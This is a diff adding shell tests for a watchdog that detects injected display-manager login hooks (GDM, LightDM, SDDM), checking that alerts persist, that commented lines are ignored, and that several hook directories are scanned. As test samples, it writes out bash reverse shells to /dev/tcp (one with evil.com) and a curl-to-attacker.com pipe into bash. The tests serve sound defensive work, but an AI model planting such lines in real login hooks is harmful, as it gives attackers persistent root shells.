@@ -185,3 +185,68 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-dm-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): display-manager-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 graphical-login-triggered root exec persistence — injection
+    # alert MUST persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/Default"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"dm_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # DM hook scripts are /bin/sh; # comments. Operator notes
+    # about hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# Default\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${HOOKD}/Default"
+    run_wd
+    ! cap | grep -q '"event":"dm_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-DM-dir scan: GDM + LightDM + SDDM dir axes — injection in ANY → alert)" {
+    # DMs source hooks from multiple dirs:
+    #   GDM: /etc/gdm/PostLogin /etc/gdm/PreSession
+    #   LightDM: /etc/lightdm/lightdm.conf.d /usr/share/lightdm/lightdm.conf.d
+    #   SDDM: /usr/share/sddm/scripts /etc/sddm
+    # Attacker may plant in any. Lock multi-dir axis.
+    HOOKD2="${TMP}/PreSession"; mkdir -p "${HOOKD2}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DMHOOK_PROFILE="report" \
+    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
+    SELFDEF_DMHOOK_DIRS="${HOOKD} ${HOOKD2}" \
+    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in PreSession dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-presession"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DMHOOK_PROFILE="report" \
+    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
+    SELFDEF_DMHOOK_DIRS="${HOOKD} ${HOOKD2}" \
+    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/Default"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
